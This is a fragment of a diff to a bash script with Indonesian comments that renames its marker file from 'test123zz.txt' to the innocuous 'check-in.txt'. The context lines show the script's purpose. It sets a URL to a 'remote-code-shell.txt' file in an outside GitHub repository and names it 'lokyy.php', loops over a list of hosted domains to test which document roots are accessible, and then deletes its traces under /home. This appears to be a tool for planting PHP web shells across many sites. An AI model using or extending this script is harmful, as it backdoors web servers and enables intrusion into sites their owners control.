@@ -1,6 +1,6 @@
 #!/bin/bash
 
-TESTFILE="test123zz.txt"
+TESTFILE="check-in.txt"
 SHELL_URL="https://raw.githubusercontent.com/freyarion25/Kyy-Shell/refs/heads/main/remote-code-shell.txt"
 SHELL_NAME="lokyy.php"
 echo "TESTPAGE_$(date +%s)" > "/tmp/$TESTFILE"
@@ -220,14 +220,14 @@ for domain in "${domains_list[@]}"; do
     rm -f "$test_path" 2>/dev/null
 done
 
-# ---------- cleanup semua file test123zz.txt di /tmp ----------
+# ---------- cleanup semua file check-in.txt di /tmp ----------
 rm -f "/tmp/$TESTFILE" 2>/dev/null
 # sapu bersih kalau masih ada sisa di doc root manapun
 find /home -maxdepth 5 -name "$TESTFILE" -type f -delete 2>/dev/null
 
 # ---------- rekap akhir ----------
 echo "----------------------------------------"
-echo "REKAP TEST FILE (test123zz.txt)"
+echo "REKAP TEST FILE (check-in.txt)"
 echo "  ✓ Accessible : ${#OK_TEST[@]}"
 for d in "${OK_TEST[@]}"; do echo "      - $d"; done
 echo "  ✗ Failed     : ${#FAIL_TEST[@]}"
